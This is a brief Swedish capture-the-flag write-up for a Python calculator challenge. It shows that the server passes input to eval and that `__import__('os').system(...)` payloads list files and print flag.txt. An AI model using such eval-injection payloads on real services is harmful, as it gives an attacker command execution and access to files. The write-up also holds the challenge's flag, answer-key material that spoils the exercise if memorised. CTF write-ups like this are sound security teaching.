# Pwn: Helt ok miniräknare

- **Skapare:** Herman Karlsson
- **Poäng:** 200
- **Antal lösningar:** 31

## Beskrivning

Evert har lärt sig av sina misstag och har byggt en bättre miniräknare, nu finns det inga buggar alls

I den här uppgiften fick man en ip och port till en server där main.py kördes.

## Flagga

SSM{d0nt_d0_mi5tak3s}

## Lösning

Testa att skriva in lite saker tills något går sönder:
```
Traceback (most recent call last):
  File "main.py", line 14, in <module>
    print(eval(expr))
  File "<string>", line 1, in <module>
NameError: name 'aasf' is not defined

```

Då ser man att det är eval som körs på saker.

Då kan man testa `open("flag.txt")` eller nått, men det går inte.

Istället så kan man köra `__import__("os").system("ls")`, och sedan `__import__("os").system("cat flag.txt")`
